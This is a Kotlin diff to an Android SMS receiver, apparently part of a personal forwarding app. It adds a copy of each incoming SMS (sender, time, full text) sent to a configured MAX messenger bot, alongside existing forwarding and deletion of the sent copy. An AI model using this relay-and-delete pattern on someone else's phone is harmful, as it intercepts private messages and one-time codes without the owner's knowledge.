@@ -9,6 +9,7 @@ import android.provider.Telephony
 import android.telephony.SmsManager
 import android.util.Log
 import java.util.Date
+import java.text.SimpleDateFormat
 
 class SmsReceiver : BroadcastReceiver() {
 
@@ -38,6 +39,19 @@ class SmsReceiver : BroadcastReceiver() {
         Log.d(TAG, "Forwarding to $forwardNumber: $forwardText")
 
         sendSms(context, forwardNumber, forwardText)
+
+        // Дублируем в MAX-бота, если настроен
+        if (SettingsManager.isMaxConfigured()) {
+            val dateFormat = SimpleDateFormat("dd.MM HH:mm", java.util.Locale.getDefault())
+            val maxText = "📨 SMS от: $cleanNumber\n📅 ${dateFormat.format(Date())}\n💬 $fullMessage"
+            MaxBotClient.sendAsync(
+                token = SettingsManager.maxBotToken!!,
+                chatId = SettingsManager.maxChatId,
+                text = maxText,
+                onSuccess = { Log.d(TAG, "MAX copy sent successfully") },
+                onError = { Log.e(TAG, "Failed to send MAX copy", it) }
+            )
+        }
 
         // Удаляем отправленное сообщение с разными форматами номера
         val phoneFormats = listOf(
